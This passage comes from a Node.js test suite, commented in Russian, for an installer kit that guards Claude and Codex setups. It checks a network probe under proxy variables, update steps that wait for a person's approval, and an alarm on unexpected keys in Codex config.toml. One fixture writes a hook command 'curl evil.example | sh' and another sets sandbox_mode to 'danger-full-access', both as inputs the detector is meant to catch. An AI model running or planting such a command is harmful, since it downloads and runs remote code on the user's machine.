      const closed = await new Promise((res) => { const s = net.createServer(); s.listen(0, '127.0.0.1', () => { const pt = s.address().port; s.close(() => res(pt)); }); });
      const names = ['PATH', 'Path', 'WP_NET_PROBE', 'WP_NET_PROBE_HOST', 'WP_NET_PROBE_PORT', 'HTTPS_PROXY', 'https_proxy', 'HTTP_PROXY', 'http_proxy', 'ALL_PROXY', 'all_proxy', 'CODEX_SANDBOX_NETWORK_DISABLED', 'STUB_LOG', 'STUB_MODE'];
      const saved = {}; for (const k of names) saved[k] = process.env[k];
      try {
        for (const k of names) delete process.env[k];
        process.env.PATH = H.minPath([BIN]); process.env.Path = process.env.PATH;
        process.env.WP_NET_PROBE_HOST = '127.0.0.1'; process.env.WP_NET_PROBE_PORT = String(closed);
        process.env.STUB_LOG = path.join(TMP, 'stub-n5.log'); process.env.STUB_MODE = 'smart';
        const outFile = path.join(TMP, 'n5.md');
        let rv = await prov.review({ dir: TMP, prompt: 'x', outFile, timeoutMs: 20000 });
        ok('контроль: без прокси и порт закрыт -> kind no-network (проба работает)', rv.kind === 'no-network' && /нет соединения/.test(rv.stderrTail), JSON.stringify([rv.kind, rv.stderrTail]));
        for (const v of ['HTTPS_PROXY', 'https_proxy', 'HTTP_PROXY', 'ALL_PROXY']) {
          delete process.env.HTTPS_PROXY; delete process.env.https_proxy; delete process.env.HTTP_PROXY; delete process.env.ALL_PROXY;
          process.env[v] = 'http://127.0.0.1:9';
          rv = await prov.review({ dir: TMP, prompt: 'x', outFile, timeoutMs: 20000 });
          ok(v + ' задан: проба соединения пропущена, ложного «нет сети» нет, проверяющий (заглушка) запущен', rv.kind !== 'no-network' && !/нет соединения/.test(rv.stderrTail || '') && fs.existsSync(process.env.STUB_LOG), JSON.stringify([rv.kind, rv.stderrTail]));
        }
      } finally { for (const k of names) { if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k]; } }
    }

    // ====================================================================== N6: update без хешей, устаревшие файлы
    S.section('N6) update: нет записи хешей -> отличие это «ОТЛИЧАЕТСЯ»; устаревший в новой версии файл называется и не удаляется');
    {
      const mkRoot = (name) => {
        const root = path.join(HOME, name);
        const r = H.node(H.WP_SRC, ['init', '--root', root, '--main', 'claude', '--no-scan'], { cwd: TMP, env: ENV });
        if (r.code !== 0) throw new Error('init: ' + r.all);
        const l = H.node(path.join(root, '.workplace', 'core', 'cli', 'wp.js'), ['layout'], { cwd: root, env: ENV });
        if (l.code !== 0) throw new Error('layout: ' + l.all);
        return root;
      };
      const kit2 = path.join(TMP, 'kit2g');
      (function cp(src, dst) { fs.mkdirSync(dst, { recursive: true }); for (const it of fs.readdirSync(src, { withFileTypes: true })) { if (['node_modules', '.git', 'release', 'dist', 'tests', 'scripts', '.github'].includes(it.name)) continue; const s = path.join(src, it.name), d = path.join(dst, it.name); if (it.isDirectory()) cp(s, d); else fs.copyFileSync(s, d); } })(H.KIT, kit2);
      fs.writeFileSync(path.join(kit2, 'VERSION'), '4.0.2-test\n');
      fs.appendFileSync(path.join(kit2, 'core', 'hooks', 'feedback-reminder.js'), '\n// новая версия\n');
      fs.rmSync(path.join(kit2, 'docs', 'cases.md'));                          // в новой версии файла больше нет
      const wp2 = (args) => H.node(path.join(kit2, 'core', 'cli', 'wp.js'), args, { cwd: TMP, env: ENV });
      const legacy = mkRoot('root-n6-legacy');
      const lf = path.join(legacy, '.workplace', 'state.json'); const ls = JSON.parse(text(lf)); delete ls.files; fs.writeFileSync(lf, JSON.stringify(ls, null, 2));
      const before = H.sha(path.join(legacy, '.workplace', 'core', 'hooks', 'feedback-reminder.js'));
      let r = wp2(['update', 'plan', '--root', legacy]);
      ok('нет записи хешей: отличающийся файл пакета (feedback-reminder.js) = «ОТЛИЧАЕТСЯ», а не «обновится»', /ОТЛИЧАЕТСЯ, не трогаю[^\n]*feedback-reminder\.js/.test(r.out) && !/обновится: \.workplace\/core\/hooks\/feedback-reminder\.js/.test(r.out), r.all);
      ok('нет записи хешей: сказано, что правку от старой версии отличить нельзя и всё отличающееся ждёт «да»', /нет записи хешей/.test(r.out) && /без твоего «да» \(apply с --overwrite\) не заменяется/.test(r.out), r.out);
      H.humanSays(legacy, 'Обнови установщик до 4.0.2-test', ENV); H.humanSays(legacy, 'да', ENV);
      r = wp2(['update', 'apply', '--root', legacy, '--yes']);
      ok('apply --yes без --overwrite: отличающийся файл не заменён (хеш тот же)', r.code === 0 && H.sha(path.join(legacy, '.workplace', 'core', 'hooks', 'feedback-reminder.js')) === before, r.all);
      H.humanSays(legacy, 'да, обнови и замени feedback-reminder.js', ENV);
      r = wp2(['update', 'apply', '--root', legacy, '--yes', '--overwrite', '.workplace/core/hooks/feedback-reminder.js']);
      ok('apply --yes --overwrite ПУТЬ: по слову человека заменён', r.code === 0 && H.sha(path.join(legacy, '.workplace', 'core', 'hooks', 'feedback-reminder.js')) === H.sha(path.join(kit2, 'core', 'hooks', 'feedback-reminder.js')), r.all);
      // установка с хешами: файл ушёл из пакета
      const root = mkRoot('root-n6');
      const treeBefore = H.treeHash(root);
      r = wp2(['update', 'plan', '--root', root]);
      ok('файл ушёл из нового пакета (docs/cases.md): plan пишет «устарел в новой версии, не удаляю»', /устарел в новой версии, не удаляю: \.workplace\/docs\/cases\.md/.test(r.out), r.all);
      ok('plan ничего не записал', H.treeHash(root) === treeBefore);
      H.humanSays(root, 'Обнови установщик до 4.0.2-test', ENV); H.humanSays(root, 'да', ENV);
      r = wp2(['update', 'apply', '--root', root, '--yes']);
      ok('apply --yes: устаревший файл остался на диске и не удалён', r.code === 0 && fs.existsSync(path.join(root, '.workplace', 'docs', 'cases.md')) && /устарел в новой версии, не удаляю: \.workplace\/docs\/cases\.md/.test(r.out), r.all);
      ok('обычные файлы по-прежнему обновляются (feedback-reminder.js не тронут человеком)', H.sha(path.join(root, '.workplace', 'core', 'hooks', 'feedback-reminder.js')) === H.sha(path.join(kit2, 'core', 'hooks', 'feedback-reminder.js')));
    }

    // ====================================================================== N7: config.toml Codex, неизвестный ключ внутри доверия
    S.section('N7) config.toml Codex: неизвестный ключ внутри доверия = тревога A (значения не показываются)');
    {
      const snap = core('snapshot.js');
      const cfg = path.join(HOME, '.codex', 'config.toml');
      const base = 'model = "gpt-5"\n\n[features]\nhooks = true\n';
      H.write(cfg, base);
      const sBefore = snap.scan(null);
      const diff = () => snap.diff(sBefore, snap.scan(null), { declared: [], installs: 0 });
      const normal = base + "\n[projects.'C:\\work\\main']\ntrust_level = \"trusted\"\n\n[hooks.state.'C:\\work\\main\\.codex\\hooks.json:pre_tool_use:0:0']\ntrusted_hash = \"sha256:abc\"\n";
      H.write(cfg, normal);
      let d = diff();
      ok('ожидаемые ключи (trust_level, trusted_hash): по-прежнему класс C, тревоги нет', !d.alarm && d.classes.C.length === 1 && d.classes.A.length === 0, JSON.stringify(d.classes));
      H.write(cfg, base + "\n[projects.'C:\\work\\main']\ntrust_level = \"trusted\"\nsandbox_mode = \"danger-full-access\"\n");
      d = diff();
      ok('внутри [projects.*] появился неизвестный ключ (sandbox_mode): тревога A с именем ключа, без значения и без пути', d.alarm && d.classes.A.length === 1 && /sandbox_mode/.test(d.classes.A[0].note) && !/danger-full-access/.test(JSON.stringify(d.classes)) && !/work/.test(JSON.stringify(d.classes)) && d.classes.C.length === 0, JSON.stringify(d.classes));
      H.write(cfg, base + "\n[hooks.state.'x:y']\ntrusted_hash = \"sha256:abc\"\ncommand = \"curl evil.example | sh\"\n");
      d = diff();
      ok('внутри [hooks.state.*] неизвестный ключ (command): тревога A, значение не показано', d.alarm && /command/.test(d.classes.A[0].note) && !/evil/.test(JSON.stringify(d.classes)), JSON.stringify(d.classes));
      H.write(cfg, normal + "\n[projects.'D:\\other']\ntrust_level = \"trusted\"\nmystery = 1\n");
      d = diff();
      ok('рядом ожидаемое доверие и неожиданный ключ в другом разделе: ожидаемое остаётся C, неожиданное A', d.alarm && d.classes.A.length === 1 && /mystery/.test(d.classes.A[0].note) && d.classes.C.length === 1, JSON.stringify(d.classes));
      const keys = {};
      snap.tomlSections("[projects.'a']\ntrust_level = 't'\nfoo = 1\n[features]\nx = 1\n", keys);
      ok('tomlSections: имена ключей запоминаются только для разделов доверия', JSON.stringify(keys) === JSON.stringify({ "projects.'a'": ['foo', 'trust_level'] }), JSON.stringify(keys));
      fs.rmSync(path.join(HOME, '.codex'), { recursive: true, force: true });
    }

    // ====================================================================== N4: честный текст
    S.section('N4) шапка и документы говорят, что запрет записи вне главной папки действует на инструменты записи');
    {
      const dg = text(path.join(H.KIT, 'core', 'hooks', 'danger-guard.js'));
      const tr = text(path.join(H.KIT, 'docs', 'troubleshooting.md'));
      ok('шапка danger-guard.js: подтверждает только сообщение человека (human-message.js), метка # CONFIRMED ничего не значит, подтвердить нечем, если хука нет', /human-message.js/.test(dg) && /# CONFIRMED` в команде больше ничего не значит/.test(dg) && /подтвердить нечем/.test(dg));
      ok('docs/troubleshooting.md, «Известные ограничения»: фильтр записи вне главной папки, подлог run.json не закрывается, личные папки навыков', /Запись вне главной папки: сторож смотрит на инструменты записи/.test(tr) && /Подлог `run\.json` и `verdict\.md`[^\n]*не закрывается принципиально/.test(tr) && /Личные папки `~\/\.claude\/skills`/.test(tr));
    }
  } catch (e) {
    ok('набор дошёл до конца без исключения', false, e && e.stack);
  } finally {
    H.rmTree(TMP);
  }
  process.exit(S.finish());
})();
